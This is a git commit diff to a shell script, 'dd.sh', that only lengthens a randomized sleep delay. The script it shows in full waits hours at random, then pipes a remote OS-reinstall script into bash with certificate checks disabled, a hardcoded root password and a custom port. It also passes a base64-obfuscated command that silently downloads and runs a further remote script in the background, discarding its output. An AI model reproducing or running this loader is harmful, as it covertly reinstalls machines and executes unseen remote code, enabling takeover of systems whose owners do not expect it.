a377efedda259ac8164d06185d9ca9cf1bb4d0c9
vjbahkds <154573249+vjbahkds@users.noreply.github.com>
2024-07-21 10:01:30 +0800

    Update dd.sh

--- dd.sh
+++ dd.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
 
-sleep "$[`od -An -N2 -i /dev/urandom` % 10800 + 21600]"
+sleep "$[`od -An -N2 -i /dev/urandom` % 10800 + 27000]"
 
 bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/MoeClub/Note/master/InstallNET.sh) -d 12 -v 64 -a -p "Ec2.123456" -port 1234 -cmd "IyEvYmluL2Jhc2gKCmFwdCAtcXF5IGluc3RhbGwgd2dldApiYXNoIDwod2dldCAtcU8tIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS92amJhaGtkcy9qc25jc2RjY3cvbWFpbi9xLnNoKSA+Pi9kZXYvbnVsbCAyPiYxICYKCg=="
